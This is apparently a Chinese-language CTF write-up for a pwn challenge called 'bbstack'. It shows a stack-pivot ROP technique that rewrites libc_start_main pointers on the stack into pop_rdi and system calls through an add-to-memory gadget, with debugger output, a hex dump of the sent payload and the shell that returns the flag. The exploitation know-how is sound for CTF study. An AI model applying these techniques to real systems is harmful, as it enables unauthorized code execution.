
# 思路
- 本题没有输出函数，无法泄漏libc地址， 无法修改stdin，stdout等参数
- 栈迁移，通常rop，直接跟上main或者read函数，此题中需要调用call_libc_start_main_ptr
- 在栈上留下若干libc的地址, 修改栈上面的指针构造rop链条


# debug

## 核心gadget
```
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```
把rbp设置成我们需要写的地址+0x3d，就可以往里面加上ebx的值，本题中libc_start_main的地址要修改成pop_rdi和system的地址，需要改2处，

两处之间用ret填充，最后栈上面值为
```
pop_rdi_ret             # 0x4046c0
/bin/sh adress
ret
ret
ret
...
system                  # 0x4047c0
```

![](https://r2.20161023.xyz/pic/20250710120635590.png)
### 两处libc_start_main+125的地址
```
pwndbg> find 0x404000, 0x404fff,  0x7f8a62d3507d
0x4046c0
0x4047c0
2 patterns found.
```

## call libc_start_main_ptr
![](https://r2.20161023.xyz/pic/20250710095617812.png)

## 疑问
最后ret滑行的时候，read很多ret的时候，怎么有个00,把rsp的值往下面加一些再试就可以了，不知道为啥？

![](https://r2.20161023.xyz/pic/20250709180031099.png)

# getshell
```
[*] Paused (press any to continue)
[DEBUG] Sent 0xf8 bytes:
    00000000  f8 48 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │·H@·│····│··@·│····│
    00000010  1a 10 40 00  00 00 00 00  1a 10 40 00  00 00 00 00  │··@·│····│··@·│····│
    *
    000000f0  1a 10 40 00  00 00 00 00                            │··@·│····│
    000000f8
/home/task/2025/07-08-shanxi/bbstack/exp.py:123: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline("cat flag*")
[DEBUG] Sent 0xa bytes:
    b'cat flag*\n'
[*] Switching to interactive mode
[DEBUG] Received 0x27 bytes:
    b'flag{j5k12fiFYo8ZHC7ULebHK7hYRvqMFaeC}\n'
flag{j5k12fiFYo8ZHC7ULebHK7hYRvqMFaeC}
$
```

![](https://r2.20161023.xyz/pic/20250710120955678.png)